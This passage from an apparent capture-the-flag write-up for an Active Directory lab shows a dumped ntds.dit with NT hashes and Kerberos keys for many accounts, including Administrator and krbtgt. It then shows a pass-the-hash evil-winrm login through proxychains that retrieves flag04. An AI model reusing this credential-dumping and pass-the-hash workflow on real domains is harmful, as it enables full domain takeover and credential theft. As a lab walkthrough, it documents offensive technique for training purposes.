tiangui:1226:aad3b435b51404eeaad3b435b51404ee:8b30503a779d10de17744bb56ee15b8c:::
tianwen:1227:aad3b435b51404eeaad3b435b51404ee:667454046d29e985b63a7931f4b9219d:::
tianshengli:1228:aad3b435b51404eeaad3b435b51404ee:df0febe8871e463155401c3d896244fc:::
tianshi:1229:aad3b435b51404eeaad3b435b51404ee:63d1d7be0b04f6b5b5336434a3d5a518:::
tianlong:1230:aad3b435b51404eeaad3b435b51404ee:5e121c3d4d259f35917c9c666c7c3650:::
[*] Kerberos keys from ntds.dit
Administrator:aes256-cts-hmac-sha1-96:afdaee99d584caec50bfce43fb4f524e80017d7d04fdd435849a9e8a037ba399
Administrator:aes128-cts-hmac-sha1-96:17cf30f985414dfc95092429bf74fac7
Administrator:des-cbc-md5:79a1466708cd6838
XR-DC$:aes256-cts-hmac-sha1-96:d0ad72242e3427e019423ffaf2c5e0ef8b3c24d7d19dfa168e2b6b6a183bb329
XR-DC$:aes128-cts-hmac-sha1-96:52cfe45e1f3a6b3e10733e8685dd04f5
XR-DC$:des-cbc-md5:ec86a2ba0246e36b
krbtgt:aes256-cts-hmac-sha1-96:b2f2e630f3c12c2cc2779624a11a1406c792c8f31d145246e657b230ff9f0f09
krbtgt:aes128-cts-hmac-sha1-96:5f2c868accc1f40c80fdf7094494faf4
krbtgt:des-cbc-md5:673b2937e3cd7cab
XR-0923$:aes256-cts-hmac-sha1-96:02441b847ba66594021166a9df5b18ede009ddc78da3727e0a0ca7f6b398d603
XR-0923$:aes128-cts-hmac-sha1-96:d865e85f9bb8373356e869737257af3b
XR-0923$:des-cbc-md5:0e1c435245ea6838
tianjing:aes256-cts-hmac-sha1-96:0d2a06ad0f07f0571bb99c1fae170bde9dbb57b8c364a0f5c75370dde8b449af
tianjing:aes128-cts-hmac-sha1-96:e936ddfdaab20e8445c2e182e14cd422
tianjing:des-cbc-md5:15bf5d5de52a6be3
liyuying:aes256-cts-hmac-sha1-96:488901e33ba91b2b58d927797a5ec7f8bede179e6f3b7fba62aac4b9936427c9
liyuying:aes128-cts-hmac-sha1-96:5cbb47c3d5766dc4d33c613ab6f9a45f
liyuying:des-cbc-md5:027504a7a820ba07
wangyuying:aes256-cts-hmac-sha1-96:ed3bd47fce79ad0170f48646647764054b670720e4ad31328e5f50dc191aef2d
wangyuying:aes128-cts-hmac-sha1-96:0d66d8bfb7de1aaad057270b923edf46
wangyuying:des-cbc-md5:79918564ab61fe43
yangguiying:aes256-cts-hmac-sha1-96:8b06648fe9d6e47d8df4c4a3407b9bca7d7ae8b7a355d35788e483e24b5d5329
yangguiying:aes128-cts-hmac-sha1-96:65e2c07527272134938a1754e6a47740
yangguiying:des-cbc-md5:d532798061dad50d
zhoumin:aes256-cts-hmac-sha1-96:46fab8083c4f48489b21b5da3e2fc922ef1f66cfbbc78829b2fc477e4723783d
zhoumin:aes128-cts-hmac-sha1-96:1bff68920b27915b3f1e917ad981f854
zhoumin:des-cbc-md5:9dd67c40eff13de3
chenyun:aes256-cts-hmac-sha1-96:a56040ca8fb3770f172e4d17598afe76c45e5c400bfe8be77aba7b47655fd441
chenyun:aes128-cts-hmac-sha1-96:b74c17427ac4f3a8825eb0e1c861f59c
chenyun:des-cbc-md5:706e205864a1fe64
chenmei:aes256-cts-hmac-sha1-96:4cd6ffc87bbfccc5310e03680e5bafabca1cb658dececb87642e13dcbd1a7bb1
chenmei:aes128-cts-hmac-sha1-96:6afadb7a5f030a0181e340d94cb2a76a
chenmei:des-cbc-md5:70fbabc40b7a29ef
huangmin:aes256-cts-hmac-sha1-96:3fbff1b76fbe10a02085ff0a7bbd3e7c0e153078a8afe1895b0e10d342f33a28
huangmin:aes128-cts-hmac-sha1-96:2cfb104d7aaa245c6730fa57f38899f0
huangmin:des-cbc-md5:970df24ce354fe01
jiangcheng:aes256-cts-hmac-sha1-96:b10c07048384977f2470005b67dfa9d5e7a17de0fb04d53b49a3e0fb413d0215
jiangcheng:aes128-cts-hmac-sha1-96:663b9662442e3c99eb4c71f50c83bbf1
jiangcheng:des-cbc-md5:730e89e3c2835d2a
huanggang:aes256-cts-hmac-sha1-96:9976b9d8467cadf35251c9c95d860455ebf9297ba518e7fc6794861e9d28d99c
huanggang:aes128-cts-hmac-sha1-96:91039de3cbdeee790ecaac5067d47566
huanggang:des-cbc-md5:86a17adf6bad9b8f
machao:aes256-cts-hmac-sha1-96:850f91e3ffd9d79d803a3a23e28a5308e471d954a6018bffbaf7a44c680e11d0
machao:aes128-cts-hmac-sha1-96:edf47b1011a703e69df2e35b6a2201f7
machao:des-cbc-md5:b50dd0ae4fb52619
liguihua:aes256-cts-hmac-sha1-96:bcb1317ad7701a68c8d5f1f5d8b66522b4aa2b7406cb6e401d8d97a8d75979d8
liguihua:aes128-cts-hmac-sha1-96:2c6b6bf4e88d5b3872dbcb390372bc3d
liguihua:des-cbc-md5:68dc9e8591298c2c
wangfang:aes256-cts-hmac-sha1-96:aa8e2a28614728b293c3a3dc124942228b5f75c4ff006f57bfe2edbcd9b6c409
wangfang:aes128-cts-hmac-sha1-96:24e9e3c145dea8399bd42466105c1298
wangfang:des-cbc-md5:4fd32904c2cdfbad
liguizhi:aes256-cts-hmac-sha1-96:9e8e1024cb004343e5988ed4b5ebf9530bd2373ec02569f25992a205c9209a11
liguizhi:aes128-cts-hmac-sha1-96:354350b841cb28956f4d004645c2ee83
liguizhi:des-cbc-md5:daa22a027c3e205e
wangyulan:aes256-cts-hmac-sha1-96:0d4a8d53bea31df593d42e4687e79635adf1260d2a0d71b05bb2e04466d01e6d
wangyulan:aes128-cts-hmac-sha1-96:bc222459b9e2ab8b43c18dbfff6973a7
wangyulan:des-cbc-md5:898a495258f264bf
huachunmei:aes256-cts-hmac-sha1-96:1211b996ab19e3e795177d07d01a8c7f19e8018ddd80aafaa468f232e5a698e3
huachunmei:aes128-cts-hmac-sha1-96:125cccce2e74f5d74ec510b6a350e3f1
huachunmei:des-cbc-md5:86e92a15807a4c79
jiadongmei:aes256-cts-hmac-sha1-96:ffff95cfb208f879f9b2068a0c8b08cdd60639e6b9f703ceec8a5b0c2ccc4334
jiadongmei:aes128-cts-hmac-sha1-96:d8d36b6ab86f147c82c56d7d65663617
jiadongmei:des-cbc-md5:fbfd57619bb9fdf7
liguilan:aes256-cts-hmac-sha1-96:7d32d8c89be54ab71d4e7639e978ef785d45d4fa4fb24afad21692198610ea05
liguilan:aes128-cts-hmac-sha1-96:fa8ac7ca3813c7731b1f2fc9253a0cb9
liguilan:des-cbc-md5:89b03efb86b9df49
yuxuecheng:aes256-cts-hmac-sha1-96:433edf2a97d3157630073e2b08a65c27e826df63440f4d0721857f7d3c74969a
yuxuecheng:aes128-cts-hmac-sha1-96:5e69c8750664229d1ed4a2c309f1f445
yuxuecheng:des-cbc-md5:d57502da7cfdc715
lixiuying:aes256-cts-hmac-sha1-96:8dc409b74c936f88ff977d5c7c17b5923e7c9d2129181b332a372fbf851ae6b6
lixiuying:aes128-cts-hmac-sha1-96:7731bc096f07aa3fc59fb79334f84a3c
lixiuying:des-cbc-md5:f4efd652bffd38c2
liguizhen:aes256-cts-hmac-sha1-96:69e5444825707d32c47086a0960addf5fe852c615aa1d33068fe767e2d586db7
liguizhen:aes128-cts-hmac-sha1-96:acbbd817ea86423eb2f057a099539a01
liguizhen:des-cbc-md5:2a67ceae91ae62ae
chenjianhua:aes256-cts-hmac-sha1-96:f0924fc23af017ce6564b3cc1cd9fabd05fe5b5d8be129be5df65133943f0470
chenjianhua:aes128-cts-hmac-sha1-96:d1c0724b5498230ed579d769676cde56
chenjianhua:des-cbc-md5:b3d68ad93e6151fe
yangjuan:aes256-cts-hmac-sha1-96:43d37ef5df5d3330b632b12e2829fc447ab0516ea220b6a9856bed989457086f
yangjuan:aes128-cts-hmac-sha1-96:2005c468b32775081cc37652cb96ecda
yangjuan:des-cbc-md5:940e98e3510d0d1f
lidan:aes256-cts-hmac-sha1-96:5573faaba91091eca180b3bd85af973dea9376b8c61ac3f95927e4a9d42bb64b
lidan:aes128-cts-hmac-sha1-96:6ca7b107e36c69573a2145ac18a32aab
lidan:des-cbc-md5:c1c740bca81a01c4
liyang:aes256-cts-hmac-sha1-96:368c633291007799691c311cd51f075b23daf7404fdaf846c4ef578fd65af2ff
liyang:aes128-cts-hmac-sha1-96:6d254393e532337391ed5bf0f28bd8b0
liyang:des-cbc-md5:baa13b32e3ae0e4f
zhaojun:aes256-cts-hmac-sha1-96:0d64e2fd344b63bbfddf3bd7a59090ccf5164e15178b2016b55a1e750d312524
zhaojun:aes128-cts-hmac-sha1-96:545fdb088d59961732860089791831ab
zhaojun:des-cbc-md5:2cad52ab57b69185
chenxin:aes256-cts-hmac-sha1-96:632e0ad6d26bd68e155f5f41c4221706f54f8e05998932626bccb795fdc7c51d
chenxin:aes128-cts-hmac-sha1-96:27bb7eabfc84cfe3ef31c7a9ac82d5f2
chenxin:des-cbc-md5:f12f6b077c9e5286
chenfei:aes256-cts-hmac-sha1-96:8653f8a0c80d9b00fc7de8954bf7412354cc68ec1646359edca95d25ad0a88d1
chenfei:aes128-cts-hmac-sha1-96:d50fc4b371bb48d6c514c99a9fe22a12
chenfei:des-cbc-md5:45ce29800e0bec38
chenhao:aes256-cts-hmac-sha1-96:244b7e6dcf52043cbcef620af6e2de7473626b28ec661ec76afd385ac18de271
chenhao:aes128-cts-hmac-sha1-96:adc33c162098184ac781947c4cc52424
chenhao:des-cbc-md5:8945e9feef9bb95e
lifei:aes256-cts-hmac-sha1-96:ae7363ebdeba1e7304f0f8cbee97fc11b65989d90669a21ad9534ffa99307609
lifei:aes128-cts-hmac-sha1-96:3f8d5b322c3ab7bc868bb0bdcc1941d5
lifei:des-cbc-md5:9843d568238f2ca4
zhangfang:aes256-cts-hmac-sha1-96:13149438681fe298dbdc3195933b0d12b520fdc19beed12ccdd759b2876ec473
zhangfang:aes128-cts-hmac-sha1-96:87c2f2db0c8f52c38eb716322233aaa3
zhangfang:des-cbc-md5:31e39e23df375efd
zhangkun:aes256-cts-hmac-sha1-96:6a92de23b62a7a981372f25862cb15f4754c30bf5621f220c9ea0b614ef5f6e3
zhangkun:aes128-cts-hmac-sha1-96:a6de080a2379a63d32a83b68664a9d1e
zhangkun:des-cbc-md5:2f2964df6ea8a4fb
yanglei:aes256-cts-hmac-sha1-96:b2e73d98dd93709436341867ae798817666464bd845c78aaa8ae1a8ec9dd384c
yanglei:aes128-cts-hmac-sha1-96:4e36c64295765d639cf726c4d288a1c3
yanglei:des-cbc-md5:c8642316cdf2c4f7
chenxia:aes256-cts-hmac-sha1-96:c808029491533d77785b1f8524e793a258a360bb32d18fc2fb092bf2b6e5e4ae
chenxia:aes128-cts-hmac-sha1-96:58cb554bd6965ce5ede4f162b71f3114
chenxia:des-cbc-md5:7057133d688938e6
zhangkai:aes256-cts-hmac-sha1-96:266d5fac40d3d0eb98756a8f1d3989f73deb7b828814ee444940dd035ef8b469
zhangkai:aes128-cts-hmac-sha1-96:994ed7ddbc91fb11daa4871c050e7479
zhangkai:des-cbc-md5:9d512919518a1c76
liuyu:aes256-cts-hmac-sha1-96:c8f33c45558655ac14720066270be7c7c6b39f7e51e23c920e3dc002a560fb36
liuyu:aes128-cts-hmac-sha1-96:d3ed22d7212aae06ecd66d3329d7436b
liuyu:des-cbc-md5:7002bac25b79494a
chenming:aes256-cts-hmac-sha1-96:a105587d48671d737f2b157387801fa5cdc8ae6f71d7a001d2a5c8aabc527a5e
chenming:aes128-cts-hmac-sha1-96:485a8993fd4158e5cbe15f7c9d0b5ba0
chenming:des-cbc-md5:d3793db004efe589
mali:aes256-cts-hmac-sha1-96:b9aa8e0a378585ca77bdcc237fdec9772f8926ade0f2484ec57c5a3ad77be4ad
mali:aes128-cts-hmac-sha1-96:96c881437be8422c98876f77bcd17f8f
mali:des-cbc-md5:6783da3145a80870
chengang:aes256-cts-hmac-sha1-96:189cef2f3df1b20e67a47bbc52e47fe5a3fa135b7a179921db75a23add12491e
chengang:aes128-cts-hmac-sha1-96:8989abbab9dd4d6c592f44843d144ed1
chengang:des-cbc-md5:8c7a86dc70d93e83
huangwei:aes256-cts-hmac-sha1-96:47409c2356a5b4b35f47a2c094129806687dbf5d371fecaabd306d0d6a6a7a7c
huangwei:aes128-cts-hmac-sha1-96:18a6b14982eaf1632550dca3553e786c
huangwei:des-cbc-md5:7a8abf32ae678652
lixia:aes256-cts-hmac-sha1-96:71990bae8e42d7afb988fd8c085192b62117b929bc632514b26067c81a408071
lixia:aes128-cts-hmac-sha1-96:67e54c4fd23d21f466c2d221f059bfcb
lixia:des-cbc-md5:263449465edc946e
xujing:aes256-cts-hmac-sha1-96:02e1509264194ced75b98f79967461e7780df97195f60474f4200c473588ed57
xujing:aes128-cts-hmac-sha1-96:30e97e50335033cafa9778e493567b24
xujing:des-cbc-md5:6dd56780f4579dc7
zhangjuan:aes256-cts-hmac-sha1-96:a469ff2fd19f472f1dfe1e301c44e44c8ceae2a9df065b29ee929f85dbaa8c5d
zhangjuan:aes128-cts-hmac-sha1-96:6c0bad8269b7460b9255f1ef26f9cb64
zhangjuan:des-cbc-md5:e962498fb90e757a
chenhui:aes256-cts-hmac-sha1-96:8456a5c089d601092a3eb142d1a8b6fa391e6fa707985da0f5a6d9512aa2f0a5
chenhui:aes128-cts-hmac-sha1-96:85ae6b41314586a7aef3dbcd443400c0
chenhui:des-cbc-md5:940e839464d06d58
liying:aes256-cts-hmac-sha1-96:4269ed8cd2c11584b0b67188a36b97fcc4a2e39bc4ba1f0ae3ab45329da2cd6a
liying:aes128-cts-hmac-sha1-96:778adcb89c1b1b82409623deb5af003b
liying:des-cbc-md5:a743a743c11f10ba
zhaoli:aes256-cts-hmac-sha1-96:dd9304d96d8cd2bbabada50ea482f4206ceba309590727771a8d57ef9a06a236
zhaoli:aes128-cts-hmac-sha1-96:d11d14a4ed03bfdb42ecf3cbd565b71b
zhaoli:des-cbc-md5:58ce9179fee6f1ad
zhoujing:aes256-cts-hmac-sha1-96:bf1237d53687578f0097bf7d92da3791bb59510d5bbd5fba3a34b612393042d3
zhoujing:aes128-cts-hmac-sha1-96:ddebd80f19a091b0c5db58bbd5de7d09
zhoujing:des-cbc-md5:9edff1017c023e7c
zhaoyong:aes256-cts-hmac-sha1-96:bc9c259cb28f85122cd973471c6c673bde03b9927a2058fbd112e01bd9509e39
zhaoyong:aes128-cts-hmac-sha1-96:b3be655b130bfdc1a5ae611544a7d74e
zhaoyong:des-cbc-md5:daa19192a78fc8fd
wangyu:aes256-cts-hmac-sha1-96:2e6969f11503f5dc619603395a56d541711ef621fe966a6ae9564e814d6db35d
wangyu:aes128-cts-hmac-sha1-96:4d2c21bcef8f3f234c23c9cfdb8d36cb
wangyu:des-cbc-md5:5e5dbc57ec0d6892
yangli:aes256-cts-hmac-sha1-96:fd2c88aa981430b7b57087878426f9aa33685bfb63889e512a7523e9e7b7e5ad
yangli:aes128-cts-hmac-sha1-96:b1d07abe126fc688e5fd5d0954a0f5a5
yangli:des-cbc-md5:8cc85eb55213df80
yangliu:aes256-cts-hmac-sha1-96:502f8f06819d4ca123bf0df2369bc01e39b10beaae9736bb89abd84aed191fda
yangliu:aes128-cts-hmac-sha1-96:b85b63efbafc11c81c903fbed1dacfe1
yangliu:des-cbc-md5:d0e6ec61d398c7a7
wangying:aes256-cts-hmac-sha1-96:21e7193624de64b091a50e40d237b7f7b95d98906c93361e668e1549a09964a6
wangying:aes128-cts-hmac-sha1-96:34559e58805b50fe63bd5b961b5e2781
wangying:des-cbc-md5:c198fe298023adb3
chenjie:aes256-cts-hmac-sha1-96:97f92bb027a23aa3e6c2f6f1e3be29b55ddae5894eec1b7bb64a2f404178f82f
chenjie:aes128-cts-hmac-sha1-96:246586d92c3a2112abdb78f6be6426fb
chenjie:des-cbc-md5:4ae9757f4346ae6e
yangyong:aes256-cts-hmac-sha1-96:a10d5f57e67555b38c94130eb639bfc1f3b5677eac62092ba23617fa15db0920
yangyong:aes128-cts-hmac-sha1-96:85bc63a86588f89b3d2130fde972814a
yangyong:des-cbc-md5:649140daa754e034
lixin:aes256-cts-hmac-sha1-96:5193d0c97992d131cf3e1daf9663d21c41b59c24df5f9800989e75d6cec2c026
lixin:aes128-cts-hmac-sha1-96:08bb58e1e3c1768a3938c1dde3fabcfb
lixin:des-cbc-md5:dc7a768945a8856d
zhanghui:aes256-cts-hmac-sha1-96:28c0a77a1889fbfbe41516244c96fb374558f3ed3edf9432d131470513d1e166
zhanghui:aes128-cts-hmac-sha1-96:7c928a8e82893e033fda12414479f5e9
zhanghui:des-cbc-md5:10baad3e9d708397
chenlin:aes256-cts-hmac-sha1-96:0501a62dd2b81829e06b4d02104541280730a1e6b0016f7fea9f1d7607342eb9
chenlin:aes128-cts-hmac-sha1-96:8666d30a719f44d7982835ae67af6936
chenlin:des-cbc-md5:d30ea8c180549d2a
chenjuan:aes256-cts-hmac-sha1-96:04cf01b384731d37fd48560e80f9d6f165c975f4023397c70e57483fccda3c80
chenjuan:aes128-cts-hmac-sha1-96:fbdee824097b2bb693c11f4c52134ca5
chenjuan:des-cbc-md5:fbb3b35ed0d96797
chenchen:aes256-cts-hmac-sha1-96:16250fd1a2d3ae95b67e57a8acc6f435faec821b61cedd21bc27c8c7ede16196
chenchen:aes128-cts-hmac-sha1-96:af6d75b3fef90e2c6e61e293de29bc84
chenchen:des-cbc-md5:f78319b9a2da5445
wangbing:aes256-cts-hmac-sha1-96:491d52f25c8ab1285b311334aa18ac3a49c4caf2c49364f5d20ef0cf3267b752
wangbing:aes128-cts-hmac-sha1-96:944ef5275279bc9ff350912313680a3e
wangbing:des-cbc-md5:c86273856dea3e92
chenling:aes256-cts-hmac-sha1-96:8ca2fa002a4fac085e9843e1fee471fbf216352c15c160eaa9a8e248359ba08f
chenling:aes128-cts-hmac-sha1-96:1f9dcffdd9cb633d7473c8ad9dbc0979
chenling:des-cbc-md5:57a7ead0f204949b
yangmei:aes256-cts-hmac-sha1-96:7fe6a96f3ea8521ac38c8d9a6afbb63432d09837d3edb65e328b5b42524ba4d3
yangmei:aes128-cts-hmac-sha1-96:5784edf9af99c8f4b11d477ac467e581
yangmei:des-cbc-md5:6d40859286b6c285
tiangui:aes256-cts-hmac-sha1-96:ea973d77cb1e7553eebf74f252f6e65d3ded442a2e903882130a891b0857ae5c
tiangui:aes128-cts-hmac-sha1-96:4b0540f9f84c834834b7630ba572b161
tiangui:des-cbc-md5:57bf1c150bf4163b
tianwen:aes256-cts-hmac-sha1-96:0d50bde0354833c30284bb4e5105fe6efde9a6d394492c17ebad628abda6a120
tianwen:aes128-cts-hmac-sha1-96:623189263738cd93d353cc69ed901587
tianwen:des-cbc-md5:e0f18f37293b4a46
tianshengli:aes256-cts-hmac-sha1-96:86dd2340322e692dc84a55b58a071193c61aa9f42ccb5313b1e9faea32901a17
tianshengli:aes128-cts-hmac-sha1-96:a48d66d1a413fbac7a84dd8b36f0018d
tianshengli:des-cbc-md5:3b5b76839b15b691
tianshi:aes256-cts-hmac-sha1-96:42a569ceee74f3ffeed1ec3660e38240154ec993d3dced11210ed9fd4c2ffcd3
tianshi:aes128-cts-hmac-sha1-96:38cd8b41da38afbade0a00993f4d7bbb
tianshi:des-cbc-md5:49d0c4d93861732f
tianlong:aes256-cts-hmac-sha1-96:d1ce4031b5d242c4e6e24831e69dd78147eb7ade76e2cda79459ee10e77e5477
tianlong:aes128-cts-hmac-sha1-96:860569a4d25b4649055da07b96d2e41f
tianlong:des-cbc-md5:e9464389858c0ba1
[*] Cleaning up...

```

使用域管理员凭据登录，获取 flag：

```
┌──(root㉿kali)-[~]
└─# proxychains4 -q evil-winrm -i 172.22.14.11 -u Administrator -H 70c39b547b7d8adec35ad7c09fb1d277

*Evil-WinRM* PS C:\Users\Administrator\flag> type flag04.txt
.______   .______       __  ____    ____  __   __       _______   _______  _______
|   _  \  |   _  \     |  | \   \  /   / |  | |  |     |   ____| /  _____||   ____|
|  |_)  | |  |_)  |    |  |  \   \/   /  |  | |  |     |  |__   |  |  __  |  |__
|   ___/  |      /     |  |   \      /   |  | |  |     |   __|  |  | |_ | |   __|
|  |      |  |\  \----.|  |    \    /    |  | |  `----.|  |____ |  |__| | |  |____
| _|      | _| `._____||__|     \__/     |__| |_______||_______| \______| |_______|

Good job!

flag04: flag{e951aebe-6b6d-4a9f-b73a-9ae071475330}
```
